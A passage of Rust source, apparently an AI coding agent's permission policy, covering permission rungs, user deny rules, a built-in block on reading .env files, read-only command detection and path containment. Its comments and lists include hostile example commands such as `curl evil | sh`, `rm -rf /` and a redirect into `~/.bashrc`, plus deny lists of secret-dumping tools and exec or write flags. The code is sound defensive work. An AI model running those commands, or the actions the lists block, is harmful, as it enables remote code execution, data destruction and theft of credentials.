//! Permission policy: four escalating rungs (disabled / allowlist / auto /
//! turbo) plus plan mode, a user-editable allow *and deny* list, command
//! patterns, and read-only command detection so the agent can explore freely
//! without nagging.
//!
//! The deny tier is evaluated first — ahead of the read-only shortcut, plan
//! mode and every rung — so a deny always wins. That is the whole point of the
//! tier: "never `rm -rf`, in any project, even though I allow `npm *`" has to be
//! sayable, and a deny one could click through would not be a deny.

use super::store::AllowRule;
use serde_json::Value;
use std::path::{Path, PathBuf};

pub enum Decision {
    Allow,
    Ask {
        title: String,
        detail: String,
        reason: String,
        rule: Option<String>,
    },
    Deny(String),
}

/// Full Access is the default when no permission choice has been recorded.
pub fn default_perm() -> String {
    "turbo".into()
}

/// Deserialize a permission choice, normalizing old blank values while leaving
/// any unknown non-empty value for the fail-closed permission check.
pub fn deserialize_perm<'de, D>(deserializer: D) -> Result<String, D::Error>
where
    D: serde::Deserializer<'de>,
{
    let perm = <String as serde::Deserialize>::deserialize(deserializer)?;
    Ok(if perm.is_empty() {
        default_perm()
    } else {
        perm
    })
}

pub struct Ctx<'a> {
    pub perm: &'a str,
    pub plan: bool,
    pub cwd: &'a str,
    pub project: &'a str,
    pub allow: &'a [AllowRule],
}

/// Which rung of the ladder `ctx.perm` names.
///
/// The legacy spellings older `settings.json` / task / saved-prompt files carry
/// are folded in here rather than migrated on load: `perm` is written in three
/// places (settings, every task, every saved prompt), so there is no single
/// load site a migration could reach. `ask` was this ladder's middle rung under
/// its old name; `full` is `turbo`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rung {
    /// Only read-only commands run. Everything else is refused, not asked.
    Disabled,
    /// Read-only and allow-listed commands run; everything else asks.
    Allowlist,
    /// Edits inside the working directory run; commands ask unless allowed.
    Auto,
    /// Everything runs except what a deny rule names.
    Turbo,
}

impl Rung {
    fn of(perm: &str) -> Rung {
        match perm {
            "" => Rung::Turbo,
            "full" | "turbo" => Rung::Turbo,
            "auto" => Rung::Auto,
            "disabled" => Rung::Disabled,
            // "ask" is this rung's old name, and the catch-all means an id
            // written by a newer build lands on the middle rung rather than on
            // Turbo — an unknown value must fail *closed*.
            _ => Rung::Allowlist,
        }
    }
}

impl Ctx<'_> {
    fn rung(&self) -> Rung {
        Rung::of(self.perm)
    }
    /// Whether the built-in `.env` read deny is active. On unless a rule turns
    /// it off (see `env_deny_active`).
    fn env_files_denied(&self) -> bool {
        env_deny_active(self.allow)
    }
}

/// The placeholder a rule can use for the current project, so "never this file,
/// anywhere" can be written once instead of per project, e.g.
/// `cat __APP_CWD__/.env`. Expanded at match time against `ctx.cwd`.
pub const RULE_CWD: &str = "__APP_CWD__";

/// The project-less rule that turns the built-in `.env` deny off entirely.
const ALLOW_ENV_FILES: &str = "allow_env_files";

/// `Some(pattern-without-the-!)` when this is a deny rule, `None` for an allow
/// rule. Deny rules share `AllowRule`'s shape and live in the same array; a
/// leading `!` is the only thing that distinguishes them.
fn deny_pattern(pattern: &str) -> Option<&str> {
    pattern.strip_prefix('!')
}

/// A rule's scope. Empty `project` = every project. Deny rules are created
/// project-less by the UI, so they are global by default — a deny the user
/// wrote must not stop applying because they opened another folder.
fn rule_scope_matches(project: &str, ctx_project: &str) -> bool {
    project.is_empty() || project == ctx_project
}

fn expand_cwd(pattern: &str, cwd: &str) -> String {
    pattern.replace(RULE_CWD, &cwd.replace('\\', "/"))
}

/// The `*`-glob body of `matches_rule`, without its chaining guard.
///
/// Split out so deny rules can match *inside* a chained line. `matches_rule`
/// deliberately refuses a chained command — that guard is what stops an allow
/// rule covering a second command the user never approved, and it must not be
/// weakened. A deny is the opposite direction: matching more is fail-closed, so
/// `!rm -rf *` has to catch `npm test && rm -rf /`.
fn glob_match(pattern: &str, cmd: &str) -> bool {
    let cmd = cmd.trim();
    let p = pattern.trim();
    // `foo *` means "foo, optionally followed by args", never `foobar`.
    let (body, tail) = match p.strip_suffix(" *") {
        Some(b) => (b, r"(\s.*)?"),
        None => (p, ""),
    };
    let re = format!("^{}{}$", regex::escape(body).replace(r"\*", ".*"), tail);
    regex::Regex::new(&re)
        .map(|r| r.is_match(cmd))
        .unwrap_or(false)
}

/// Whether a *deny* rule matches this command. Unlike `matches_rule` it looks
/// at every segment of the line as well as the whole, so a deny reaches the
/// dangerous half of `a && b`, and it does not stop at a redirect or a
/// substitution.
fn deny_matches(pattern: &str, cmd: &str) -> bool {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return false;
    }
    let bare = strip_leading_cd_loop(cmd);
    if glob_match(pattern, cmd) || glob_match(pattern, bare) {
        return true;
    }
    cmd.split(['&', '|', ';', '\n', '\r'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .any(|seg| glob_match(pattern, seg))
}

/// Whether the command reaches a path the pattern names via `RULE_CWD`.
///
/// A literal match is not enough here: `cat .env` has to be caught by a rule
/// written `cat __APP_CWD__/.env`, and those two strings share no prefix.
/// Deny-favouring, so both slash spellings are tried.
fn named_path_reached(pattern: &str, cmd: &str, cwd: &str) -> bool {
    if !pattern.contains(RULE_CWD) {
        return false;
    }
    let expanded = expand_cwd(pattern, cwd);
    deny_matches(&expanded, cmd) || deny_matches(&expanded, &cmd.replace('\\', "/"))
}

/// Whether an *allow* rule covers this command. Deny rules never allow, even
/// though they share the array.
fn allow_hit(cmd: &str, ctx: &Ctx) -> bool {
    let bare = strip_leading_cd_loop(cmd);
    ctx.allow.iter().any(|r| {
        deny_pattern(&r.pattern).is_none()
            && rule_scope_matches(&r.project, ctx.project)
            && matches_rule(&r.pattern, bare)
    })
}

/// The one refusal message for a fired deny rule, so the reason is the same
/// wherever the rule was written. It names the rule (a refusal that teaches
/// beats a bare "denied", which invites a retry loop) and says how to undo it.
fn denied_message(rule: &str) -> String {
    format!(
        "Denied by the rule `{rule}`: a deny rule always wins, over every allow rule, the allowlist and Turbo. Don't retry this — change your approach, or ask the user, who can remove the rule in Settings → Permissions."
    )
}

/// A deny rule that names a tool directly: `!mcp__gh__create_issue`,
/// `!mcp__gh__create_issue *`, `!some_future_tool`.
fn named_deny(name: &str, ctx: &Ctx) -> Option<String> {
    let star = format!("{name} *");
    ctx.allow
        .iter()
        .find(|r| {
            deny_pattern(&r.pattern).is_some_and(|p| {
                rule_scope_matches(&r.project, ctx.project) && (p == name || p == star)
            })
        })
        .map(|r| denied_message(&r.pattern))
}

/// A deny rule that names a plugin action: `!github:create_issue`,
/// `!browser:click`, `!computer *`.
fn plugin_deny(tool: &str, action: &str, ctx: &Ctx) -> Option<String> {
    let rule = match tool {
        "github" => format!("github:{action}"),
        "computer" => "computer *".to_string(),
        "browser" => format!("browser:{action}"),
        _ => return None,
    };
    let star = format!("{tool} *");
    ctx.allow
        .iter()
        .find(|r| {
            deny_pattern(&r.pattern).is_some_and(|p| {
                rule_scope_matches(&r.project, ctx.project) && (p == rule || p == star)
            })
        })
        .map(|r| denied_message(&r.pattern))
}

/// Whether a path names an env file: `.env`, a dotted variant (`.env.local`),
/// or a name ending in `.env` (`dev.env`).
///
/// `.env.example`, `.env.sample`, `.env.template` and `.env.dist` are committed
/// templates, not secrets, and are deliberately *not* env files (opencode draws
/// the same line). Judged on the file name alone, so a directory called
/// `.env.d` does not trip it and neither does a source file named `env.ts`.
pub fn is_env_path(path: &str) -> bool {
    let name = file_name(path);
    if [".example", ".sample", ".template", ".dist"]
        .iter()
        .any(|t| name.ends_with(t))
    {
        return false;
    }
    name == ".env" || name.starts_with(".env.") || name.ends_with(".env")
}

const ENV_DENY_MSG: &str = "Reading an environment file (*.env, *.env.*) is refused: they hold credentials, and a read is how they leave the machine. `.env.example` and `.env.sample` are readable. If this file is not secret, allow it in Settings → Permissions with a rule such as `read_file .env`.";

/// The same deny for the shell: `cat .env`, `grep x .env`. Without this the
/// built-in deny is decorative — `bash` is the obvious way round a `read_file`
/// check. Narrow on purpose: only a *read-only* command, and only when one of
/// its words names an env file, so ordinary builds and tests are untouched.
const ENV_CMD_DENY_MSG: &str = "Reading an environment file (*.env, *.env.*) with a shell command is refused: they hold credentials. Use `.env.example` for the shape, or allow this file in Settings → Permissions with a rule such as `cat .env`.";

/// Whether a rule the user wrote names this exact file: it mentions `.env`
/// somewhere and one of its words *is* this file's name. `read_file .env`,
/// `cat .env.local`, `cat __APP_CWD__/.env` (expanded first) all qualify; a rule
/// that merely mentions an env path in passing does not. The `.env` guard is
/// what keeps a generic `cat *`-shaped rule from being read as naming anything.
fn rule_names_file(rule: &str, cwd: &str, name: &str) -> bool {
    let p = expand_cwd(rule, cwd).to_ascii_lowercase();
    p.contains(".env")
        && p.split_whitespace().any(|w| {
            let w = w
                .trim_end_matches('*')
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or(w);
            w == name
        })
}

/// The file name of a path, lowercased — the unit the env rules match on.
fn file_name(path: &str) -> String {
    path.rsplit(['/', '\\'])
        .next()
        .unwrap_or(path)
        .to_ascii_lowercase()
}

fn env_allows_file(allow: &[AllowRule], project: &str, path: &str, cwd: &str) -> bool {
    let name = file_name(path);
    allow.iter().any(|r| {
        if deny_pattern(&r.pattern).is_some() || !rule_scope_matches(&r.project, project) {
            return false;
        }
        r.pattern == ALLOW_ENV_FILES || rule_names_file(&r.pattern, cwd, &name)
    })
}

/// A user deny rule written against a *path* rather than a command: `!read_file
/// .env`, `!read_file *.pem`, `!view_image __APP_CWD__/shot.png`, `!*.pem`.
/// Checked for the tools that hand back a file's bytes, where the command-shaped
/// denies cannot reach.
///
/// Two shapes: a tool-scoped rule (`read_file <glob>`), where the glob after the
/// tool word is matched against the file name and the whole path; and a bare
/// path glob (`*.pem`), matched the same way.
fn read_path_denied(tool: &str, path: &str, ctx: &Ctx) -> Option<String> {
    let name = file_name(path);
    let norm = path.replace('\\', "/");
    ctx.allow
        .iter()
        .find(|r| {
            deny_pattern(&r.pattern).is_some_and(|p| {
                if !rule_scope_matches(&r.project, ctx.project) {
                    return false;
                }
                let mut words = p.split_whitespace();
                let first = words.next().unwrap_or("");
                if first == tool || first == "*" {
                    let rest: Vec<&str> = p.split_whitespace().skip(1).collect();
                    if !rest.is_empty() {
                        let sub = rest.join(" ");
                        return glob_match(&sub, &name)
                            || glob_match(&sub, path)
                            || glob_match(&sub, &norm);
                    }
                }
                matches_rule(p, &name) || matches_rule(p, path) || matches_rule(p, &norm)
            })
        })
        .map(|r| denied_message(&r.pattern))
}

fn env_deny_active(allow: &[AllowRule]) -> bool {
    !allow
        .iter()
        .any(|r| r.pattern == ALLOW_ENV_FILES && r.project.is_empty())
}

/// Whether a shell command dumps a file's contents (as opposed to searching for
/// a pattern or listing a directory). The strings of these commands *are* file
/// contents, which is what makes them the env-exfil path worth denying; the
/// omission is the conservative direction — the cost is one un-denied miss, not a
/// false refusal of a legitimate search.
fn dumps_file_contents(cmd: &str) -> bool {
    const DUMPERS: &[&str] = &[
        "cat",
        "tac",
        "head",
        "tail",
        "nl",
        "less",
        "more",
        "bat",
        "sed",
        "awk",
        "cut",
        "sort",
        "uniq",
        "tee",
        "xxd",
        "od",
        "strings",
        "base64",
        "get-content",
        "gc",
        "type",
    ];
    cmd.split(['|', ';', '&', '\n'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .any(|seg| {
            let first = {
                let w = seg.split_whitespace().next().unwrap_or("");
                w.rsplit(['/', '\\'])
                    .next()
                    .unwrap_or(w)
                    .to_ascii_lowercase()
            };
            DUMPERS.contains(&first.as_str())
        })
}

/// Repeats of one identical tool call before the agent is asked. Counts the
/// current call, so `DOOM_LOOP_AT = 5` means the *fifth* identical call is the
/// one that prompts — the caller passes how many already ran.
pub const DOOM_LOOP_AT: u32 = 5;

/// The decision for a call that is being made again with identical input.
///
/// `None` below the threshold. At it the call is an `Ask`, so the loop is
/// surfaced to the user rather than silently continuing; well past it it becomes
/// a `Deny`, because a runaway that can only be clicked through is not stopped
/// by a prompt. The runner owns the counting and the "already answered"
/// bookkeeping — this only decides.
pub fn doom_loop_decision(tool: &str, input: &Value, repeats: u32) -> Option<Decision> {
    if repeats + 1 < DOOM_LOOP_AT {
        return None;
    }
    if repeats + 1 >= DOOM_LOOP_AT * 3 {
        return Some(Decision::Deny(format!(
            "This exact `{tool}` call has now been made {} times with identical input. It is looping, so it is refused. Stop and change approach: re-read the last result, change the input or the tool, or ask the user.",
            repeats + 1
        )));
    }
    let detail = serde_json::to_string_pretty(input).unwrap_or_else(|_| input.to_string());
    Some(Decision::Ask {
        title: format!("Repeated `{tool}` call"),
        detail: detail.chars().take(600).collect(),
        reason: format!(
            "This is occurrence {} of an identical `{tool}` call in this run. It may be looping.",
            repeats + 1
        ),
        rule: None,
    })
}

/// Tools that never change anything.
pub fn is_read_only_tool(name: &str) -> bool {
    matches!(
        name,
        "read_file"
            | "read"
            | "view_image"
            | "screenshot"
            | "glob"
            | "grep"
            | "web_fetch"
            | "web_search"
            | "todo_write"
            | "ask_user"
            | "ask_nonblocking"
            | "notify_user"
            | "bash_output"
            | "task"
            | "task_status"
            | "ask"
            | "exit_plan_mode"
            | "goal_complete"
            | "start_ultrathread"
            | "list_dir"
            | "artifact_preview"
            | "artifact_list"
            | "artifact_get"
            | "artifact_feedback_list"
    )
}

/// Tools that only read the web. The deep-research pair qualifies, so a fan-out
/// of `web_read_many` calls still runs concurrently — they touch no state.
pub fn is_web_read_tool(name: &str) -> bool {
    matches!(
        name,
        "web_fetch" | "web_search" | "web_search_deep" | "web_read_many"
    )
}

const READ_ONLY_CMDS: &[&str] = &[
    "ls",
    "dir",
    "pwd",
    "cat",
    "head",
    "tail",
    "wc",
    "echo",
    "printf",
    "which",
    "where",
    "type",
    "file",
    "stat",
    "tree",
    "find",
    "grep",
    "rg",
    "ag",
    "du",
    "df",
    "sort",
    "uniq",
    "cut",
    "diff",
    "env",
    "printenv",
    "whoami",
    "date",
    "uname",
    "basename",
    "dirname",
    "realpath",
    "sha256sum",
    "md5sum",
    "get-childitem",
    "get-content",
    "get-location",
    "select-string",
    "test",
    "true",
    "[",
];
const READ_ONLY_GIT: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "branch",
    "remote",
    "rev-parse",
    "ls-files",
    "blame",
    "describe",
    "tag",
    "config",
    "shortlog",
    "reflog",
    "grep",
];

/// A leading `cd …` (or `pushd …`) is a no-op: every command already starts in
/// the working directory. Strip it so a model that prefixes `cd D:/project && …`
/// is judged on what the command actually does — otherwise the read-only guard
/// and the "always allow" rules both reject the harmless prefix, and agents get
/// denied for a `cd` habit. Only a leading, self-contained `cd` is stripped: the
/// `cd` must be the first word and must not be followed by anything but a plain
/// path (`cd -`, `cd -P`, `cd --` and substitutions are left alone).
/// Returns the rest of the command, or `None` when nothing was stripped.
pub fn strip_leading_cd(cmd: &str) -> Option<&str> {
    /// A plain path argument: no shell metacharacters, no spaces, no flags.
    fn is_plain_path(s: &str) -> bool {
        !s.is_empty()
            && !s.starts_with('-')
            && s.chars()
                .all(|ch| ch.is_ascii_alphanumeric() || "/\\._:@+=~".contains(ch))
    }
    let (word, rest) = cmd.trim_start().split_once(char::is_whitespace)?;
    if !(word.eq_ignore_ascii_case("cd") || word.eq_ignore_ascii_case("pushd")) {
        return None;
    }
    // Everything after the `cd`'s own argument is the command it chains to.
    let end = rest.find([';', '|', '&', '\n', '<', '>'])?;
    if !is_plain_path(rest[..end].trim()) {
        return None;
    }
    // Only a plain sequence continues the line: `cd a | ls` or a backgrounded
    // `cd a & ls` mean something else, so they're judged as written.
    let after = &rest[end..];
    let tail = after
        .strip_prefix("&&")
        .or_else(|| after.strip_prefix("||"))
        .or_else(|| after.strip_prefix(';'))?
        .trim_start();
    if tail.is_empty() {
        None
    } else {
        Some(tail)
    }
}

/// Read-only as a model sees it: a leading `cd` or wrapper doesn't count.
pub fn read_only_command(cmd: &str) -> bool {
    is_read_only_command(strip_leading_cd_loop(cmd))
}

/// Wrappers stripped before rule matching and read-only judgement, the way
/// Claude Code does it, so a rule the user wrote for the real command still
/// applies when the model prefixes it (`timeout 30 npm test` under `npm test *`).
///
/// Deliberately *only* a leading, fully-understood wrapper. A wrapper we decline
/// to strip costs the user one approval prompt; a wrapper stripped wrongly would
/// match a rule for a command the user did not allow, which is the failure this
/// guards. So bare `xargs` is absent (its input *is* the command and is not
/// visible here) and so is a leading `VAR=value` assignment (its value is
/// shell-evaluated and it can precede anything).
fn is_strippable_wrapper(word: &str) -> bool {
    matches!(
        word,
        "timeout" | "time" | "nice" | "nohup" | "stdbuf" | "command" | "builtin" | "ionice"
    )
}

/// The short flags of the wrappers above that provably take the next word as
/// their value. Anything else bare is left alone rather than guessed at: a
/// boolean flag read as arg-taking would swallow the real command, and a
/// value read as boolean would leave the value behind as the command — both
/// match a rule for something the user did not allow.
fn flag_takes_arg(flag: &str) -> bool {
    matches!(flag, "-n" | "-c" | "-s" | "-k" | "-o" | "-e")
}

/// Advance past a wrapper's leading flags (`nice -n 10`). `None` when a flag's
/// arity cannot be determined — the conservative direction, since a wrongly
/// skipped word could leave us matching a rule for a command the user did not
/// allow.
fn skip_flags(s: &str) -> Option<&str> {
    let mut t = s.trim_start();
    // A wrapper never has many flags of its own; a handful bounds a pathological
    // input without changing any real one.
    for _ in 0..4 {
        if !t.starts_with('-') || t == "-" {
            return Some(t);
        }
        let (flag, rest) = t.split_once(char::is_whitespace).unwrap_or((t, ""));
        if flag.starts_with("--") {
            // Only `--name=value` is unambiguous; a bare `--name` may or may not
            // take the next word.
            if !flag.contains('=') {
                return None;
            }
            t = rest.trim_start();
        } else if flag.len() > 2 {
            // A short flag with an attached value (`-n10`, `-oL`).
            t = rest.trim_start();
        } else if flag_takes_arg(flag) {
            // A known arg-taking short flag: consume its value.
            t = rest
                .trim_start()
                .split_once(char::is_whitespace)?
                .1
                .trim_start();
        } else {
            // A bare short flag of unknown arity (`-p`, `-v`): refuse to guess.
            return None;
        }
    }
    (!t.starts_with('-')).then_some(t)
}

/// Strip a leading wrapper (`timeout 30 npm test` -> `npm test`), or `None`.
/// Composed with `strip_leading_cd` by `strip_leading_cd_loop`.
pub fn strip_leading_wrapper(cmd: &str) -> Option<&str> {
    let (word, rest) = cmd.trim_start().split_once(char::is_whitespace)?;
    if !is_strippable_wrapper(word) {
        return None;
    }
    let mut tail = skip_flags(rest)?;
    // `timeout`'s first argument is its duration, not part of the command.
    if word.eq_ignore_ascii_case("timeout") {
        let (dur, after) = tail.split_once(char::is_whitespace)?;
        if !dur.chars().next().is_some_and(|c| c.is_ascii_digit()) {
            // Not the `timeout DURATION cmd` shape we understand: leave it alone.
            return None;
        }
        tail = after.trim_start();
    }
    (!tail.is_empty()).then_some(tail)
}

/// `strip_leading_cd` and `strip_leading_wrapper` applied left to right until
/// neither applies: `cd web && timeout 30 npm test` -> `npm test`.
///
/// Used for rule matching and read-only judgement alike, so a rule the user
/// wrote for the real command still applies when the model wraps it. The loop is
/// bounded because neither stripper can return its input unchanged after
/// succeeding, so it terminates anyway; the cap is belt-and-braces.
fn strip_leading_cd_loop(mut cmd: &str) -> &str {
    for _ in 0..8 {
        let next = strip_leading_cd(cmd).or_else(|| strip_leading_wrapper(cmd));
        match next {
            Some(rest) if !rest.is_empty() && rest.len() < cmd.len() => cmd = rest,
            _ => break,
        }
    }
    cmd
}

/// Conservative: every segment of a pipeline/sequence must be a known
/// read-only command, and nothing may redirect into a file or substitute.
pub fn is_read_only_command(cmd: &str) -> bool {
    let c = cmd.trim();
    if c.is_empty() || c.contains('>') || c.contains("$(") || c.contains('`') || c.contains("<(") {
        return false;
    }
    let segments = c
        .split(['|', ';', '&', '\n'])
        .map(str::trim)
        .filter(|s| !s.is_empty());
    for seg in segments {
        let mut words = seg.split_whitespace();
        let Some(first) = words.next() else { continue };
        let first = first.to_ascii_lowercase();
        if first == "git" {
            let sub = words.find(|w| !w.starts_with('-')).unwrap_or("");
            if !READ_ONLY_GIT.contains(&sub) {
                return false;
            }
            // `git branch -D`, `git tag -d`, `git config --set`… are writes.
            if seg.contains(" -d")
                || seg.contains(" -D")
                || seg.contains("--delete")
                || (sub == "config"
                    && !seg.contains("--get")
                    && !seg.contains("--list")
                    && !seg.contains(" -l"))
            {
                return false;
            }
            continue;
        }
        if first == "find" && (seg.contains("-delete") || seg.contains("-exec")) {
            return false;
        }
        // A first-token allowlist cannot say "does not write or spawn", so the
        // dangerous *arguments* of an otherwise read-only command are refused
        // here. Without this, `env curl …`, `find … -fprintf /path …`,
        // `sort -o /path …` and `git diff --output=/path …` were all classified
        // read-only and auto-approved in every mode, including a read-only
        // sub-agent — arbitrary code execution and arbitrary file writes with
        // no prompt at all. These are cheap to detect and never appear in the
        // honest `ls -la` / `grep foo .` forms the list exists for.
        if spawns_or_writes(seg) {
            return false;
        }
        if seg.ends_with("--version") || seg.ends_with(" -v") || seg == "node -v" {
            continue;
        }
        if !READ_ONLY_CMDS.contains(&first.as_str()) {
            return false;
        }
    }
    true
}

/// Arguments that make a read-only command write a file or run another program.
/// A deny-list because the safe set is what the allow-list is for: anything not
/// named here still has to pass the allow-list, and the only cost of missing a
/// pattern is one extra approval prompt, not a hole.
fn spawns_or_writes(seg: &str) -> bool {
    const BAD: &[&str] = &[
        // Any interpreter / launcher / downloader used as an argument. `env`
        // and `find` are the two that made this reachable: both take a command.
        "-exec",
        "-execdir",
        "-fprintf",
        "-fprint",
        "-fls",
        // `env`/`xargs`/`timeout`/`nice`/`nohup`/`stdbuf` run what follows.
        "-i",
        "--ignore-environment",
        // git plumbing that writes to disk or runs a helper program.
        "--output",
        "--output-indicator",
        "--open-files-in-pager",
        "--ext-diff",
        "--textconv",
        "--upload-pack",
        "--receive-pack",
        "-o",
        "--exec-path",
        // `sort -o` and `sort --output` overwrite a file in place.
        "--output=",
        // Generic write/exec flags common to the coreutils in the list.
        "--save",
        "--in-place",
        "-i.bak",
    ];
    let low = seg.to_ascii_lowercase();
    if BAD.iter().any(|b| low.contains(b)) {
        return true;
    }
    // `git remote add` / `git config user.email x` mutate the repo even though
    // the subcommand is on the read list.
    if low.starts_with("git ")
        && (low.contains(" remote add")
            || low.contains(" remote set-url")
            || low.contains(" remote rename"))
    {
        return true;
    }
    // `env VAR=x cmd` executes `cmd`. Bare `env`/`printenv` just print the
    // environment and stay read-only — they are the common way a model inspects
    // a variable, and refusing them would push every such call to a prompt.
    let words: Vec<&str> = low.split_whitespace().collect();
    if words.first() == Some(&"env") && words.len() > 1 {
        return true;
    }
    // `xargs` runs its input, and `command`/`eval`/`exec`/`source` are shells.
    let first = words.first().copied().unwrap_or("");
    if matches!(
        first,
        "xargs"
            | "eval"
            | "exec"
            | "source"
            | "."
            | "trap"
            | "command"
            | "nohup"
            | "timeout"
            | "nice"
            | "stdbuf"
            | "watch"
            | "time"
            | "nproc"
            | "unshare"
            | "setsid"
    ) {
        return true;
    }
    false
}

/// True when a command string chains, redirects or substitutes, so a single
/// "always allow" rule must not be treated as covering the whole line.
///
/// The set is deliberately generous. A false positive costs the user one
/// approval prompt for a command they already allowed; a false negative hands
/// a model an unapproved second command, which is the thing this guards.
fn has_chaining(cmd: &str) -> bool {
    // `$( )` and `<( )` substitute another command's output; the metacharacters
    // inside them are not the ones in the outer line, so both are checked whole.
    cmd.contains("$(")
        || cmd.contains("<(")
        || cmd.contains('`')
        || cmd.contains('&')
        || cmd.contains('|')
        || cmd.contains(';')
        || cmd.contains('\n')
        || cmd.contains('\r')
        || cmd.contains('>')
        || cmd.contains('<')
}

/// Allow rules are prefix patterns with `*` wildcards, e.g. `pnpm test *`.
///
/// **Do not simplify this by dropping the chaining guard.** It is tempting — a
/// deny rule matches *inside* a chained command (that is the right direction for
/// a deny, see `deny_matches`), so "surely the allow side could too". It must
/// not. This guard is the single line that stops a rule the user approved for
/// `pnpm test` from silently covering `pnpm test > ~/.bashrc` or
/// `pnpm test && curl evil | sh`. Allow and deny are asymmetric on purpose: a
/// false allow is a sandbox escape, a false deny is one prompt.
pub fn matches_rule(pattern: &str, cmd: &str) -> bool {
    let cmd = cmd.trim();
    let p = pattern.trim();
    // Never let a rule cover a chained command. `&& || ; |` are the obvious
    // separators, but a newline, a bare `&`, a redirection, a substitution or
    // `2>&1` chains just as effectively — a rule the user approved for
    // `pnpm test` must not silently cover `pnpm test > ~/.bashrc`.
    if has_chaining(cmd) {
        return false;
    }
    // `foo *` means "foo, optionally followed by args", never `foobar`.
    let (body, tail) = match p.strip_suffix(" *") {
        Some(b) => (b, r"(\s.*)?"),
        None => (p, ""),
    };
    let re = format!("^{}{}$", regex::escape(body).replace(r"\*", ".*"), tail);
    regex::Regex::new(&re)
        .map(|r| r.is_match(cmd))
        .unwrap_or(false)
}

/// Suggest an "always allow" pattern: the command plus its subcommand.
pub fn suggest_rule(cmd: &str) -> String {
    let words: Vec<&str> = cmd.split_whitespace().collect();
    let take = if words.len() > 1 && !words[1].starts_with('-') {
        2
    } else {
        1
    };
    format!(
        "{} *",
        words
            .iter()
            .take(take)
            .cloned()
            .collect::<Vec<_>>()
            .join(" ")
    )
}

/// True when `path` is `root` or lives under it.
///
/// Both sides go through `canonicalize`, so `..` and symlinks are resolved
/// before the comparison — a prefix match on the raw strings would let
/// `/repo-backup` pass a `/repo` root. Windows' `canonicalize` also returns the
/// `\\?\` verbatim form, which is why the comparison is component-wise: a
/// `\\?\C:\repo` root used to be compared against a `C:\repo\…` path and every
/// in-tree write was reported as outside the working directory. That is
/// fail-closed, so it was not a hole, but it nagged users into approving edits
/// they had already allowed, and approving one flips the whole task to a
/// permission mode that drops this check.
/// True when `path` is `root` or lives under it. Exposed so other surfaces that
/// take a path from the renderer — the "open this file" chip, for one — can
/// apply the same containment the write path already gets.
pub fn inside_public(path: &str, root: &str) -> bool {
    inside(path, root)
}

fn inside(path: &str, root: &str) -> bool {
    let (p, r) = (
        normalized_filesystem_path(Path::new(path)),
        normalized_filesystem_path(Path::new(root)),
    );
    component_relative_path(&p, &r).is_some()
}

/// Resolve existing ancestors (including symlinks) before comparing paths, and
/// retain missing tail components so new files are checked just like existing
/// ones. This is shared with the edit restriction check to keep their boundary
/// and traversal semantics identical.
fn normalized_filesystem_path(path: &Path) -> PathBuf {
    use std::path::Component;
    match std::fs::canonicalize(path) {
        Ok(c) => c,
        Err(_) => {
            // Not created yet: canonicalize the deepest existing ancestor and
            // re-attach what is left. Keep `..` verbatim until lexical
            // normalization; dropping it here used to make a traversal through
            // a missing directory appear to stay inside the root.
            let mut tail: Vec<std::ffi::OsString> = Vec::new();
            let mut cur = path.to_path_buf();
            loop {
                if let Ok(c) = std::fs::canonicalize(&cur) {
                    let mut out = c;
                    for part in tail.iter().rev() {
                        out.push(part);
                    }
                    return lexical_normalize(&out);
                }
                let (last, comps) = cur
                    .components()
                    .next_back()
                    .map(|c| (c, cur.components()))
                    .unwrap_or((Component::CurDir, cur.components()));
                let parent: PathBuf = comps.collect();
                if parent == cur {
                    return lexical_normalize(path);
                }
                match last {
                    Component::Normal(name) => tail.push(name.to_os_string()),
                    Component::ParentDir => tail.push(std::ffi::OsString::from("..")),
                    Component::CurDir => {}
                    other => tail.push(other.as_os_str().to_os_string()),
                }
                cur = parent;
            }
        }
    }
}

/// Return the components beneath `root` only when `path` is component-wise
/// contained by it. A textual prefix would mistake `/repo-backup` for `/repo`.
fn component_relative_path(path: &Path, root: &Path) -> Option<PathBuf> {
    let path_components: Vec<_> = path.components().collect();
    let root_components: Vec<_> = root.components().collect();
    if root_components.len() > path_components.len()
        || !path_components
            .iter()
            .zip(&root_components)
            .all(|(path, root)| same_path_component(path, root))
    {
        return None;
    }

    let mut relative = PathBuf::new();
    for component in path_components.iter().skip(root_components.len()) {
        relative.push(component.as_os_str());
    }
    Some(relative)
}

fn same_path_component(left: &std::path::Component<'_>, right: &std::path::Component<'_>) -> bool {
    #[cfg(windows)]
    {
        use std::path::Component;
        match (left, right) {
            (Component::Prefix(a), Component::Prefix(b)) => a
                .as_os_str()
                .to_string_lossy()
                .eq_ignore_ascii_case(&b.as_os_str().to_string_lossy()),
            (Component::Normal(a), Component::Normal(b)) => a
                .to_string_lossy()
                .eq_ignore_ascii_case(&b.to_string_lossy()),
            (Component::RootDir, Component::RootDir)
            | (Component::CurDir, Component::CurDir)
            | (Component::ParentDir, Component::ParentDir) => true,
            _ => false,
        }
    }
    #[cfg(not(windows))]
    {
        left == right
    }
}

/// Whether a caller has an actual `fileRegex` restriction. Kept type-agnostic
/// so callers can pass an `AgentDef` group's optional pattern without coupling
/// this permission helper to the store model.
pub fn has_file_restriction(pattern: Option<&str>) -> bool {
    pattern.is_some_and(|pattern| !pattern.is_empty())
}

/// Refuse an edit when its resolved path is outside the task root or its
/// project-relative, forward-slash-normalized path fails the agent's regex.
/// Invalid regexes fail closed. The absolute path is used only for containment;
/// the regex is never given an absolute path to match.
pub fn file_restriction_denial(
    agent_name: &str,
    pattern: &str,
    description: &str,
    tool: &str,
    resolved_path: &str,
    cwd: &str,
) -> Option<String> {
    if !has_file_restriction(Some(pattern)) {
        return None;
    }

    let candidate = Path::new(resolved_path);
    let root = Path::new(cwd);
    let candidate = if candidate.is_absolute() {
        candidate.to_path_buf()
    } else {
        root.join(candidate)
    };
    let normalized_candidate = normalized_filesystem_path(&candidate);
    let normalized_root = normalized_filesystem_path(root);
    let relative = component_relative_path(&normalized_candidate, &normalized_root);
    let display_path = relative
        .as_ref()
        .map(|path| path.to_string_lossy().replace('\\', "/"))
        .unwrap_or_else(|| normalized_candidate.to_string_lossy().replace('\\', "/"));

    let matches = regex::Regex::new(pattern)
        .map(|regex| {
            !resolved_path.is_empty()
                && relative.is_some_and(|path| {
                    !path.as_os_str().is_empty()
                        && regex.is_match(&path.to_string_lossy().replace('\\', "/"))
                })
        })
        .unwrap_or(false);
    if matches {
        return None;
    }

    let description = if description.is_empty() {
        String::new()
    } else {
